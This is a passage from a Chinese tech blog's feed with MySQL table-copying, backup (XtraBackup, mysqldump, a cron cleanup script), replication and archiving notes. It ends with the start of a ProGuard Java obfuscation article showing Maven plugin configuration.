class="comment">-- like创建出来的新表包含源表的完整表结构和索引信息</span></span><br><span class="line"><span class="comment">-- mysql适用; oracle不支持(as方式参考下文)</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test_new <span class="keyword">like</span> <span class="keyword">test</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 复制表结构(不含默认值等)、索引及数据到新表</span></span><br><span class="line"><span class="comment">-- oracle不会复制到表结构的备注和默认值；mysql可以复制备注，但是主键会丢失，可使用like</span></span><br><span class="line"><span class="comment">-- 200w 的数据 3s 复制完成</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test_new <span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test_new <span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="number">1</span>=<span class="number">2</span>; <span class="comment">-- 只复制表结构到新表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> test_new <span class="keyword">as</span> <span class="keyword">select</span> row_id, <span class="keyword">name</span>, age <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="number">1</span>&lt;&gt;<span class="number">1</span>; <span class="comment">-- 复制部分字段</span></span><br></pre></td></tr></table></figure><h3 id="复制数据"><a href="#复制数据" class="headerlink" title="复制数据"></a>复制数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 复制旧表的数据到新表(假设两个表结构一样)</span></span><br><span class="line"><span class="comment">-- 此时会边复制边创建索引，速度可能会慢，可先临时关闭索引，参考下文</span></span><br><span class="line"><span class="comment">-- 执行时是会把test表给锁住的，在锁期间是不允许任何操作，保证数据一致性</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test_new <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="comment">-- 复制旧表的数据到新表(假设两个表结构不一样)</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test_new(字段<span class="number">1</span>,字段<span class="number">2</span>,.......) <span class="keyword">select</span> 字段<span class="number">1</span>,字段<span class="number">2</span>,...... <span class="keyword">from</span> <span class="keyword">test</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- mysql骚操作代替oracle dual</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test_new(a, b)</span><br><span class="line"><span class="keyword">select</span> t.a, t.b <span class="keyword">from</span> (</span><br><span class="line"><span class="keyword">select</span> <span class="number">10</span> a, <span class="number">20</span> b</span><br><span class="line"><span class="keyword">UNION</span> ALL</span><br><span class="line"><span class="keyword">select</span> <span class="number">11</span> a, <span class="number">21</span> b</span><br><span class="line"><span class="keyword">UNION</span> ALL</span><br><span class="line"><span class="keyword">select</span> <span class="number">12</span> a, <span class="number">22</span> b</span><br><span class="line">) t <span class="keyword">where</span> <span class="keyword">not</span> <span class="keyword">exists</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> test_new <span class="keyword">where</span> a=<span class="number">11</span> <span class="keyword">and</span> b=<span class="number">21</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 优化一: 批量插入大量数据，临时关闭索引加快复制速度</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> test_new <span class="keyword">disable</span> <span class="keyword">keys</span>; <span class="comment">-- 临时关闭索引</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test_new <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span>; <span class="comment">-- 复制数据 (由于没有索引，速度有很大提升)</span></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> test_new <span class="keyword">enable</span> <span class="keyword">keys</span>; <span class="comment">-- 开启索引 (开启时会自动优化索引)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 优化二: 增加索引防止锁表</span></span><br><span class="line"><span class="comment">-- test_new 是表锁；order_today逐步锁(扫描一个锁一个)，如果没有where条件或者查询没有走索引则相当于全表扫描，即等同于锁表</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test_new <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> create_time &gt; <span class="string">'2000-01-01'</span>;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> test_new <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">force</span> <span class="keyword">index</span> (idx_create_time) <span class="keyword">where</span> create_time &gt; <span class="string">'2000-01-01'</span>;</span><br></pre></td></tr></table></figure><h3 id="delete-truncate-drop"><a href="#delete-truncate-drop" class="headerlink" title="delete/truncate/drop"></a>delete/truncate/drop</h3><ul><li>delete<ul><li>执行数据较慢，较多删除可进行批量删除(单也不能太大)</li><li>会记录事务日志，可进行回滚</li><li>不会减少表或索引所占用的空间</li></ul></li><li>truncate<ul><li>执行速度快，会删除表所有数据，但表结构不会影响</li><li>不会记录日志，删除行是不能恢复的，并且在删除的过程中不会激活与表有关的删除触发器</li><li>这个表和索引所占用的空间会恢复到初始大小</li></ul></li><li>drop<ul><li>会直接删除表结构。且会删除constrain/trigger/index，依赖于该表的存储过程/函数将被保留，但其状态会变为invalid</li><li>将表所占用的空间全释放掉</li></ul></li><li>其他异同<ul><li>truncate 只能对table；delete可以是table和view</li><li>delete语句为DML；truncate、drop是DLL</li></ul></li><li>delete 删除数据时，其实对应的数据行并不是真正的删除，仅仅是将其标记成可复用的状态，所以表空间不会变小。可以重建表的方式，快速将delete数据后的表变小（optimize table 或alter table）</li></ul><h3 id="rename"><a href="#rename" class="headerlink" title="rename"></a>rename</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- mysql中对大表进行rename的操作很快，rename命令会直接修改底层的.frm文件，常用于数据备份和恢复</span></span><br><span class="line"><span class="keyword">rename</span> <span class="keyword">table</span> <span class="keyword">user</span> <span class="keyword">to</span> user_old;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 有时需要对数据库中的表进行原子性rename，可以使用</span></span><br><span class="line"><span class="keyword">rename</span> <span class="keyword">table</span> <span class="keyword">user</span> <span class="keyword">to</span> user_old, user_bak <span class="keyword">to</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure><h2 id="XtraBackup"><a href="#XtraBackup" class="headerlink" title="XtraBackup"></a>XtraBackup</h2><ul><li>XtraBackup(PXB) 工具是 Percona 公司用 perl 语言开发的一个用于 MySQL 数据库物理热备的备份工具，支持 MySQl（Oracle）、Percona Server 和 MariaDB，并且全部开源<ul><li>阿里的 RDS MySQL 物理备份就是基于这个工具做的</li><li>由于是采取物理拷贝的方式来做的备份，所以速度非常快，<strong>几十G数据几分钟就搞定了</strong></li><li>而它巧妙的利用了mysql 特性做到了<strong>在线热备份</strong>，不用像以前做物理备份那样必须关闭数据库才行，直接在线就能完成整库或者是部分库的全量备份和增量备份</li></ul></li><li>其中最主要的命令是 innobackupex 和 xtrabackup<ul><li>前者是一个 perl 脚本，后者是 C/C++ 编译的二进制。Percona 在2.3 版本用C重写了 innobackupex，innobackupex 功能全部集成到 xtrabackup 里面，只有一个 binary，另外为了使用上的兼容考虑，innobackupex 作为 xtrabackup 的一个软链接</li><li>更多参考：<a href="https://www.cnblogs.com/piperck/p/9757068.html" target="_blank" rel="noopener">https://www.cnblogs.com/piperck/p/9757068.html</a></li></ul></li><li>数据迁移案例</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 安装(新老服务器均需安装)</span></span><br><span class="line">yum -y install perl perl-devel libaio libaio-devel perl-Time-HiRes perl-DBD-MySQL perl-Digest-MD5</span><br><span class="line">wget http://mirror.centos.org/centos/7/extras/x86_64/Packages/libev-4.15-7.el7.x86_64.rpm <span class="comment"># https://pkgs.org/download/libev(x86-64)</span></span><br><span class="line">rpm -ivh libev-4.15-7.el7.x86_64.rpm</span><br><span class="line">wget https://www.percona.com/downloads/XtraBackup/Percona-XtraBackup-2.4.24/binary/redhat/7/x86_64/percona-xtrabackup-24-2.4.24-1.el7.x86_64.rpm</span><br><span class="line">rpm -ivh percona-xtrabackup-24-2.4.24-1.el7.x86_64.rpm</span><br><span class="line">xtrabackup -version <span class="comment"># xtrabackup version 2.4.24 based on MySQL server 5.7.35 Linux (x86_64) (revision id: b4ee263)</span></span><br><span class="line"><span class="comment"># https://www.percona.com/doc/percona-xtrabackup/2.4/manual.html</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 备份(原服务器上进行)</span></span><br><span class="line"><span class="comment"># 先全量备份(热备，物理备)，提示 completed OK! 则成功</span></span><br><span class="line">mkdir –p /home/xtrabackup/</span><br><span class="line"><span class="comment"># 40G 2.5min 将mysql-data目录下文件全部进行全量备份</span></span><br><span class="line"><span class="comment"># --compress 表数据会进行压缩(压缩后为原来25%大小)，文件以.qp结尾，对应文件如`my_table.ibd.qp`</span></span><br><span class="line"><span class="comment"># --decompress 解压缩时，系统必须提前安装qpress . 数据库必须运行中</span></span><br><span class="line">innobackupex --defaults-file=/etc/my.cnf --user=root --password=root --use-memory=2G --<span class="built_in">kill</span>-long-queries-timeout=10 --ftwrl-wait-timeout=20 --compress --compress-threads=4 /home/xtrabackup/`date +%F`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再进行增量备份(热备，物理备)，提示 completed OK! 则成功</span></span><br><span class="line"><span class="comment"># 一般可停服增备份，防止数据写入</span></span><br><span class="line"><span class="comment"># 40G+ 晚上 2.5min 将datadir目录下文件全部进行增量备份，表的物理文件大小只有增加的数据大小</span></span><br><span class="line">innobackupex --defaults-file=/etc/my.cnf --user=root --password=root --incremental /home/xtrabackup/2021-09-22/ --incremental-basedir=/home/xtrabackup/2021-09-22/2021-09-22_22-19-32/</span><br><span class="line"></span><br><span class="line"><span class="comment">## 执行恢复</span></span><br><span class="line"><span class="comment"># --decompress 解压缩，系统必须提前安装qpress。提示 completed OK!</span></span><br><span class="line"><span class="comment"># 解压出来后，原压缩文件还存在？</span></span><br><span class="line">innobackupex --decompress /home/xtrabackup/2021-09-22/2021-09-22_22-19-32</span><br><span class="line"><span class="comment"># 准备恢复：所谓准备恢复，就是要为恢复做准备。就是说备份集没办法直接拿来用，因为这中间可能存在未提交或未回滚的事务，数据文件不一致，所以需要一个队备份集的准备过程</span></span><br><span class="line"><span class="comment"># completed OK!</span></span><br><span class="line">innobackupex --defaults-file=/etc/my.cnf --apply-log --redo-only /home/xtrabackup/2021-09-22/2021-09-22_22-19-32</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合并全量和增量备份 completed OK!</span></span><br><span class="line">innobackupex --defaults-file=/etc/my.cnf --apply-log --redo-only --incremental /home/xtrabackup/2021-09-22/2021-09-22_22-19-32/ --incremental-dir=/home/xtrabackup/2021-09-22/2021-09-23_08-50-05</span><br><span class="line"></span><br><span class="line"><span class="comment">## 恢复数据(在新服务器上执行)</span></span><br><span class="line"><span class="comment"># 迁移数据库时，拷贝数据到另外一台服务器</span></span><br><span class="line">systemctl stop mysqld</span><br><span class="line">mv /home/data/mysql /home/data/mysql_bak</span><br><span class="line">mkdir -p /home/data/mysql</span><br><span class="line"><span class="comment"># 将原服务器备份的数据拷贝到新服务器。rsync命令参考: http://www.ruanyifeng.com/blog/2020/08/rsync.html</span></span><br><span class="line">rsync -av root@192.168.1.100:/home/xtrabackup/2021-09-22/2021-09-22_22-19-32/ /home/data/mysql_2021-09-22</span><br><span class="line"><span class="comment"># 进行恢复</span></span><br><span class="line">innobackupex --defaults-file=/etc/my.cnf --copy-back /home/data/mysql_2021-09-22</span><br><span class="line">chown -R mysql:mysql /home/data/mysql</span><br><span class="line">systemctl start mysqld</span><br></pre></td></tr></table></figure><h2 id="导出导入"><a href="#导出导入" class="headerlink" title="导出导入"></a>导出导入</h2><ul><li>参数说明：<a href="https://www.cnblogs.com/qq78292959/p/3637135.html" target="_blank" rel="noopener">https://www.cnblogs.com/qq78292959/p/3637135.html</a></li><li>使用<code>mysqldump/source</code>方法进行导出导入<ul><li>15 分钟导出 1.6 亿条记录，导出的文件中平均 7070 条记录拼成一个 insert 语句</li><li>通过 source 进行批量插入，导入 1.6 亿条数据耗时将近 5 小时，平均速度 3200W 条/h（网测）</li></ul></li><li>导出数据</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认导出表结构和数据。回车后输入密码，text 格式数据也能被导出；测试样例：36M 数据导出耗时 15s</span></span><br><span class="line">%MYSQL_HOME%/bin/mysqldump -h 192.168.1.1 -P 3306 -uroot -p my_db_name &gt; d:/exp.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 压缩备份(linux)</span></span><br><span class="line">mysqldump -h localhost -P 3306 -uroot -p my_db_name | gzip &gt; d:/mysql_bak.$(date +%F).sql.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只导出数据库表结构</span></span><br><span class="line"><span class="comment"># -d 没有数据 --add-drop-table 在每个 create 语句之前增加一个 drop table</span></span><br><span class="line">mysqldump -h localhost -P 3306 -uroot -p -d --add-drop-table my_db_name &gt; d:/exp.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出一张表</span></span><br><span class="line">mysqldump -h localhost -P 3306 -uroot -p my_db_name my_table_name &gt; d:/exp.sql</span><br></pre></td></tr></table></figure><ul><li>导入数据</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接 CMD 命令行导入</span></span><br><span class="line">mysql -h localhost -P 3306 -uroot -p my_db_name &lt; d:/exp.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># source 方式</span></span><br><span class="line">mysql -uroot -p</span><br><span class="line">use my_db_name</span><br><span class="line"><span class="built_in">source</span> d:/exp.sql</span><br><span class="line"></span><br><span class="line"><span class="comment"># Navicat 命令行使用 source 报错，且通过界面 UI 界面导入数据也容易出错。建议到 mysql 服务器命令行导入</span></span><br></pre></td></tr></table></figure><h2 id="linux脚本备份-mysqldump"><a href="#linux脚本备份-mysqldump" class="headerlink" title="linux脚本备份(mysqldump)"></a>linux脚本备份(mysqldump)</h2><ul><li>备份 mysql 和删除备份文件脚本<code>backup-mysql.sh</code>(加可执行权限先进行测试)</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">db_user=<span class="string">"root"</span></span><br><span class="line">db_passwd=<span class="string">"root"</span></span><br><span class="line">db_name=<span class="string">"db_test"</span></span><br><span class="line">db_host=<span class="string">"127.0.0.1"</span></span><br><span class="line">db_port=<span class="string">"3306"</span></span><br><span class="line"><span class="comment"># the directory for story your backup file.you shall change this dir</span></span><br><span class="line">backup_dir=<span class="string">"/home/data/backup/mysqlbackup"</span></span><br><span class="line"><span class="comment"># date format for backup file (eg: 20190407214357)</span></span><br><span class="line">time=<span class="string">"<span class="variable">$(date +"%Y%m%d%H%M%S")</span>"</span></span><br><span class="line"><span class="comment"># 需要确保当前linux用户有执行mysqldump权限</span></span><br><span class="line">/opt/mysql57/bin/mysqldump -h <span class="variable">$db_host</span> -P <span class="variable">$db_port</span> -u<span class="variable">$db_user</span> -p<span class="variable">$db_passwd</span> <span class="variable">$db_name</span> | gzip &gt; <span class="string">"<span class="variable">$backup_dir</span>/<span class="variable">$db_name</span>"</span>_<span class="string">"<span class="variable">$time</span>.sql.gz"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除3天之前的备份</span></span><br><span class="line">find <span class="variable">$backup_dir</span> -name <span class="variable">$db_name</span><span class="string">"*.sql.gz"</span> -<span class="built_in">type</span> f -mtime +3 -<span class="built_in">exec</span> rm -rf &#123;&#125; \; &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure><ul><li>说明<ul><li>删除一分钟之前的备份 <code>find $backup_dir -name $db_name&quot;*.sql.gz&quot; -type f -mmin +1 -exec rm -rf {} \; &gt; /dev/null 2&gt;&amp;1</code></li><li><code>-type f</code> 表示查找普通类型的文件，f 表示普通文件，可不写</li><li><code>-mtime +7</code> 按照文件的更改时间来查找文件，+7表示文件更改时间距现在7天以前;如果是-mmin +7表示文件更改时间距现在7分钟以前</li><li><code>-exec rm {} ;</code> 表示执行一段shell命令，exec选项后面跟随着所要执行的命令或脚本，然后是一对{ }，一个空格和一个\，最后是一个分号;</li></ul></li><li>将上述脚本加入到<code>crond</code>定时任务中<ul><li><code>sudo crontab -e</code> 编辑定时任务，加入<code>00 02 * * * /home/smalle/script/backup-mysql.sh</code></li><li><code>systemctl restart crond</code> 重启 crond 服务</li></ul></li></ul><h2 id="主从同步"><a href="#主从同步" class="headerlink" title="主从同步"></a>主从同步</h2><ul><li>从库</li></ul><p>change master to master_host=’127.0.0.1’, master_port=3306, master_user=’rep’, master_password=’Hello1234!’, master_log_file=’shipbill-log-bin.000001’, master_log_pos=154;</p><p>show slave status \G;<br>stop slave;<br>start slave;</p><h2 id="flashback闪回"><a href="#flashback闪回" class="headerlink" title="flashback闪回"></a>flashback闪回</h2><ul><li>binlog2sq：<a href="https://github.com/danfengcao/binlog2sql" target="_blank" rel="noopener">https://github.com/danfengcao/binlog2sql</a></li><li>参考 <a href="https://www.cnblogs.com/waynechou/p/mysql_flashback_intro.html" target="_blank" rel="noopener">https://www.cnblogs.com/waynechou/p/mysql_flashback_intro.html</a></li></ul><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="历史数据归档"><a href="#历史数据归档" class="headerlink" title="历史数据归档"></a>历史数据归档</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 总数据条数 11443852, 大小 2299888KB, 17个字段, 9个索引</span></span><br><span class="line"><span class="comment">-- 查询 7 天的数据(select *)耗时 90s (走了用户名索引, 如果查询设置强制索引只需要 3s)</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(<span class="number">1</span>) <span class="keyword">from</span> ship_bill_charge t <span class="keyword">where</span> t.update_tm &gt;= <span class="string">'2022-01-01'</span>; <span class="comment">-- 2289714</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建热数据临时表(之后会重命名为新的ship_bill_charge表), 会复制字段、默认值、索引(mysql不同表的索引可重名)等</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> ship_bill_charge_2022 <span class="keyword">like</span> ship_bill_charge;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 复制今年的数据到临时表 (可考虑暂时停止数据写入). 2289714 条数据耗时 1072.781s</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> ship_bill_charge_2022 <span class="keyword">select</span> * <span class="keyword">from</span> ship_bill_charge <span class="keyword">force</span> <span class="keyword">index</span>(idx_update_tm) <span class="keyword">where</span> t.update_tm &gt;= <span class="string">'2022-01-01'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 数据表切换(原子性, 执行速度非常快)</span></span><br><span class="line"><span class="keyword">rename</span> <span class="keyword">table</span> ship_bill_charge <span class="keyword">to</span> ship_bill_charge_2021, ship_bill_charge_2022 <span class="keyword">to</span> ship_bill_charge;</span><br></pre></td></tr></table></figure><hr><p>参考文章</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;数据备份-恢复&quot;&gt;&lt;a href=&quot;#数据备份-恢复&quot; class=&quot;headerlink&quot; title=&quot;数据备份/恢复&quot;&gt;&lt;/a&gt;数据备份/恢复&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;参考&lt;a href=&quot;https://cloud.tencent.com/develop
      
    
    </summary>
    
      <category term="db" scheme="http://blog.aezo.cn/categories/db/"/>
    
    
      <category term="mysql" scheme="http://blog.aezo.cn/tags/mysql/"/>
    
      <category term="dba" scheme="http://blog.aezo.cn/tags/dba/"/>
    
  </entry>
  
  <entry>
    <title>ProGuard —— 加密java代码</title>
    <link href="http://blog.aezo.cn/2022/09/06/java/proguard/"/>
    <id>http://blog.aezo.cn/2022/09/06/java/proguard/</id>
    <published>2022-09-06T13:00:00.000Z</published>
    <updated>2023-04-16T08:54:09.975Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li><a href="https://www.guardsquare.com/" target="_blank" rel="noopener">官网</a>、<a href="https://www.guardsquare.com/manual/home" target="_blank" rel="noopener">使用手册</a></li><li>Proguard 是一个适用于 Java 平台混淆代码的工具，也可以用于 Android，虽然我们直接称为混淆，实际上 Proguard 包括 shrink（压缩），optimize（优化），obfuscate（混淆），preverify（预校验）四步<ul><li>shrink： 检测并移除没有用到的类，变量，方法和属性</li><li>optimize: 优化代码，非入口节点类会加上 private/static/final, 没有用到的参数会被删除，一些方法可能会变成内联代码</li><li>obfuscate: 使用短又没有语义的名字重命名非入口类的类名，变量名，方法名。入口类的名字保持不变</li><li>preverify: 预校验代码是否符合 Java1.6 或者更高的规范(唯一一个与入口类不相关的步骤)</li></ul></li><li>支持客户端、Grandle、Ant等，Maven需要第三方插件<ul><li>客户端使用参考: <a href="https://blog.51cto.com/jeecg/3193512" target="_blank" rel="noopener">https://blog.51cto.com/jeecg/3193512</a></li><li><a href="https://github.com/wvengen/proguard-maven-plugin" target="_blank" rel="noopener">第三方Maven插件</a><ul><li><a href="http://wvengen.github.io/proguard-maven-plugin/index.html" target="_blank" rel="noopener">文档</a></li><li><a href="https://github.com/wvengen/proguard-maven-plugin/blob/master/src/it/simple/pom.xml" target="_blank" rel="noopener">官方案例</a></li><li><a href="https://github.com/devslm/proguard-spring-boot-example" target="_blank" rel="noopener">Springboot案例</a></li></ul></li></ul></li><li>6个常用Java源代码保护工具: <a href="https://www.cnblogs.com/jpfss/p/11533257.html" target="_blank" rel="noopener">https://www.cnblogs.com/jpfss/p/11533257.html</a></li><li>相关文章<ul><li><a href="https://tech.meituan.com/2018/04/27/mt-proguard.html" target="_blank" rel="noopener">插件化、热补丁中绕不开的Proguard的坑</a></li></ul></li></ul><h2 id="Springboot案例"><a href="#Springboot案例" class="headerlink" title="Springboot案例"></a>Springboot案例</h2><ul><li><a href="https://github.com/oldinaction/smjava/blob/master/extend/proguard-springboot/pom.xml" target="_blank" rel="noopener">案例源码</a></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- proguard混淆插件. spring-boot-maven-plugin需要放到此插件的后面 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 之后打包后，会生成 proguard_map.txt 的映射文件(源码名称和混淆后名称的映射) --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.github.wvengen<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>proguard-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>run-proguard<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goal</span>&gt;</span>proguard<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 额外的jar包，通常是项目编译所需要的jar。JDK8及以下需要添加外部依赖的jar包, 否则部分场景容易报错: java.lang.VerifyError: Bad type on operand stack --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">libs</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lib</span>&gt;</span>$&#123;java.home&#125;/lib/rt.jar<span class="tag">&lt;/<span class="name">lib</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lib</span>&gt;</span>$&#123;java.home&#125;/lib/jce.jar<span class="tag">&lt;/<span class="name">lib</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">lib</span>&gt;</span>$&#123;java.home&#125;/lib/jsse.jar<span class="tag">&lt;/<span class="name">lib</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">libs</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 防止window的cmd有长度限制而报错 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span 